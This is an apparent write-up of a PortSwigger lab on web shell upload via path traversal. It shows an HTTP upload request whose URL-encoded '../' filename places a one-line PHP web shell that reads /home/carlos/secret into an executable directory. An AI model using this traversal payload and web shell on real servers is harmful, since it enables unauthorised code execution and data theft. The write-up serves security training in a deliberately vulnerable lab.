
# Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


---------------------------------------------

References: 

- https://portswigger.net/web-security/file-upload

 

![img](images/Web%20shell%20upload%20via%20path%20traversal/1.png)

---------------------------------------------

It is possible to upload a PHP file:



![img](images/Web%20shell%20upload%20via%20path%20traversal/2.png)


But it does not execute:



![img](images/Web%20shell%20upload%20via%20path%20traversal/3.png)


To execute the PHP file we will upload it in a different directory using path traversal. We need to encode the payload or it will not work (filename="%2e%2e%2fb.php"):

```
POST /my-account/avatar HTTP/2
...
-----------------------------40637643122628174081089911774
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------40637643122628174081089911774
...
```



![img](images/Web%20shell%20upload%20via%20path%20traversal/4.png)


The files is uploaded to the folder “/files” and not “/files/avatars”:



![img](images/Web%20shell%20upload%20via%20path%20traversal/5.png)